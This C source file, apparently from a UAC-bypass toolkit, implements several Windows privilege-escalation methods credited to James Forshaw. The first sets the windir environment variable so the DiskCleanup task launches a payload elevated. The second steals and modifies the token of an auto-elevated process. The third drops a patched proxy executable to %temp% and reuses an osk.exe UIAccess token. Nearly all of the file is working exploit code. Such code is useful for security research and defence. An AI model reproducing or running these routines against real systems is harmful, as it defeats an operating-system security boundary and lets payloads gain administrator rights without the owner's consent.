/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* DiskCleanup task uses current user environment variables to build a path to the executable.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
NTSTATUS ucmDiskCleanupEnvironmentVariable(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR   szEnvVariable[MAX_PATH * 2];

    do {

        if (_strlen(lpszPayload) > MAX_PATH)
            return STATUS_INVALID_PARAMETER;

        //
        // Add quotes.
        //
        szEnvVariable[0] = L'\"';
        szEnvVariable[1] = 0;
        _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariable(FALSE, NULL, T_WINDIR, szEnvVariable))
            break;

        //
        // Run trigger task.
        //
        if (supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD))
            MethodResult = STATUS_SUCCESS;

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);

    } while (FALSE);

    return MethodResult;
}

/*
* ucmTokenModification
*
* Purpose:
*
* Obtains the token from an auto-elevated process, modifies it, and reuses it to execute as administrator.
*
* Fixed in Windows 10 RS5
*
*/
NTSTATUS ucmTokenModification(
    _In_ LPWSTR lpszPayload,
    _In_ BOOL fUseCommandLine
)
{
    BOOL bSelfRun = FALSE;
    ULONG dummy;
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    HANDLE hTargetProcess = NULL;
    HANDLE hProcessToken = NULL, hDupToken = NULL, hLuaToken = NULL, hImpToken = NULL;

    LPWSTR lpApplicationName, lpCommandLine;
    PSYSTEM_PROCESSES_INFORMATION ProcessList, pList;

    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    PSID pIntegritySid = NULL;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;
    CLIENT_ID cid;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SHELLEXECUTEINFO shinfo;

    TOKEN_ELEVATION tei;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    do {

        hTargetProcess = NULL;

        //
        // Attempt to locate already elevated process running in the system.
        //
        InitializeObjectAttributes(&obja, NULL, 0, 0, NULL);
        ProcessList = (PSYSTEM_PROCESSES_INFORMATION)supGetSystemInfo(SystemProcessInformation);
        if (ProcessList) {
            pList = ProcessList;
            for (;;) {
                cid.UniqueProcess = pList->UniqueProcessId;
                cid.UniqueThread = NULL;

                //
                // Open process and query it process token elevation state.
                //
                Status = NtOpenProcess(&hTargetProcess, MAXIMUM_ALLOWED, &obja, &cid);
                if (NT_SUCCESS(Status)) {
                    Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
                    if (NT_SUCCESS(Status)) {
                        tei.TokenIsElevated = 0;
                        Status = NtQueryInformationToken(hProcessToken,
                            TokenElevation, &tei,
                            sizeof(TOKEN_ELEVATION), &dummy);
                        if (NT_SUCCESS(Status)) {
                            //
                            // Elevated process found, don't close it handles as we will re-use them next.
                            //
                            if (tei.TokenIsElevated > 0) {
                                break;
                            }
                        }
                        NtClose(hProcessToken);
                        hProcessToken = NULL;
                    }
                    NtClose(hTargetProcess);
                    hTargetProcess = NULL;
                }

                if (pList->NextEntryDelta == 0)
                    break;

                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
            }
            supHeapFree(ProcessList);
        }

        //
        // If not found then run it.
        //
        if (hTargetProcess == NULL) {

            //
            // Run autoelevated app (any).
            //
            shinfo.cbSize = sizeof(shinfo);
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            shinfo.lpFile = WUSA_EXE;
            shinfo.nShow = SW_HIDE;
            if (!ShellExecuteEx(&shinfo)) {
                break;
            }
            else {
                bSelfRun = TRUE;
                hTargetProcess = shinfo.hProcess;
            }
        }

        //
        // Open token of elevated process.
        //
        if (hProcessToken == NULL) {
            Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
            if (!NT_SUCCESS(Status))
                break;
        }

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status))
            break;

        //
        // Lower duplicated token IL from High to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status))
            break;

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
        if (!NT_SUCCESS(Status))
            break;

        //
        // Create restricted token.
        //
        Status = NtFilterToken(hDupToken, LUA_TOKEN, NULL, NULL, NULL, &hLuaToken);
        if (!NT_SUCCESS(Status))
            break;

        //
        // Impersonate logged on user.
        //
        hImpToken = NULL;
        Status = NtDuplicateToken(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY,
            &obja,
            FALSE,
            TokenImpersonation,
            &hImpToken);
        if (!NT_SUCCESS(Status))
            break;

        Status = NtSetInformationThread(
            NtCurrentThread(),
            ThreadImpersonationToken,
            &hImpToken,
            sizeof(HANDLE));

        if (!NT_SUCCESS(Status))
            break;

        NtClose(hImpToken);
        hImpToken = NULL;

        //
        // Run target.
        //
        RtlSecureZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        GetStartupInfo(&si);

        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;

        RtlSecureZeroMemory(&pi, sizeof(pi));

        if (fUseCommandLine) {
            lpApplicationName = NULL;
            lpCommandLine = lpszPayload;
        }
        else {
            lpApplicationName = lpszPayload;
            lpCommandLine = NULL;
        }

        if (CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
            LOGON_NETCREDENTIALS_ONLY,
            lpApplicationName,
            lpCommandLine,
            0,
            NULL,
            NULL,
            &si,
            &pi)) 
        {
            if (pi.hThread) CloseHandle(pi.hThread);
            if (pi.hProcess) CloseHandle(pi.hProcess);
            Status = STATUS_SUCCESS;
        }

        //
        // Revert to self.
        //
        hImpToken = NULL;
        NtSetInformationThread(
            NtCurrentThread(),
            ThreadImpersonationToken,
            (PVOID)&hImpToken,
            sizeof(HANDLE));

    } while (FALSE);

    if (hImpToken) NtClose(hImpToken);
    if (hProcessToken) NtClose(hProcessToken);
    if (hDupToken) NtClose(hDupToken);
    if (hLuaToken) NtClose(hLuaToken);

    if (bSelfRun) {
        NtTerminateProcess(hTargetProcess, STATUS_SUCCESS);
    }
    if (hTargetProcess) NtClose(hTargetProcess);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    return Status;
}

/*
* ucmxTokenModUIAccessMethodInitPhase
*
* Purpose:
*
* Convert dll to new entrypoint/exe.
*
*/
BOOL ucmxTokenModUIAccessMethodInitPhase(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE;

    WCHAR szBuffer[MAX_PATH * 2];

    do {

        //
        // Patch Fubuki to the new entry point and convert to EXE
        //
        if (!supReplaceDllEntryPoint(ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_UIACCESS2,
            TRUE))
        {
            break;
        }

        //
        // Drop modified Fubuki.exe to the %temp%
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, FUBUKI_EXE);
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        bResult = TRUE;

    } while (FALSE);

    if (bResult == FALSE) {
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, FUBUKI_EXE);
        DeleteFile(szBuffer);
    }

    return bResult;
}

/*
* ucmTokenModUIAccessMethod
*
* Purpose:
*
* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
*
*/
NTSTATUS ucmTokenModUIAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{  
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    LPWSTR lpszPayload = NULL;
    PSID pIntegritySid = NULL;
    HANDLE hDupToken = NULL, hProcessToken = NULL;
    SHELLEXECUTEINFO shinfo;
    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;
    WCHAR szBuffer[MAX_PATH * 2];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        
    do {
        //
        // Tweak and drop payload to %temp%.
        //
        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
            break;

        //
        // Spawn OSK.exe process.
        //
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, OSK_EXE);

        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = szBuffer;
        shinfo.nShow = SW_HIDE;
        if (!ShellExecuteEx(&shinfo))
            break;

        //
        // Open process token.
        //
        Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
        if (!NT_SUCCESS(Status)) 
            break;

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status))
            break;

        NtClose(hProcessToken);
        hProcessToken = NULL;

        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
        shinfo.hProcess = NULL;

        //
        // Lower duplicated token IL from Medium+ to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status))
            break;

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
        if (!NT_SUCCESS(Status))
            break;

        RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);

        // 
        // Run second stage exe to perform some gui hacks.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, FUBUKI_EXE);

        if (g_ctx->OptionalParameterLength == 0)
            lpszPayload = g_ctx->szDefaultPayload;
        else
            lpszPayload = g_ctx->szOptionalParameter;

        if (CreateProcessAsUser(hDupToken,
            szBuffer,    //application
            lpszPayload, //command line
            NULL,
            NULL,
            FALSE,
            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi)) 
        {
            if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                TerminateProcess(pi.hProcess, (UINT)-1);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Status = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (hProcessToken) NtClose(hProcessToken);

    if (shinfo.hProcess) {
        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
    }
    if (hDupToken) NtClose(hDupToken);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, FUBUKI_EXE);
    DeleteFile(szBuffer);

    return Status;
}
